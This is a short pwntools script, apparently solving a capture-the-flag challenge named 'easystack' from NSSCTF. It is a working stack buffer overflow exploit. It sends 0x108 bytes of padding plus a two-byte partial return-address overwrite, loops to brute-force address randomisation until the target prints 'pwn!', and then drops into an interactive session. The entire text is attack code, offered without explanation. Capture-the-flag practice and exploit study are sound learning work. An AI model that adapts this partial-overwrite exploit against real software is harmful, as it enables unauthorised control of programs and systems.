from pwn import *

#io = remote("node5.anna.nssctf.cn", 21457)
context.log_level = 'debug'
elf = ELF("./easystack")

while (1):
    io = process("./easystack")
    try:
        payload = b"a" * (0x100+0x8) + p16(0x1185)
        io.recvuntil(b"name?")
        io.send(payload)
        io.recv()
        output = io.recv()
        print("after: ", output)
        if b"pwn!" in output:
            io.interactive()
            break
    except Exception as e:
        io.close()
    sleep(1)

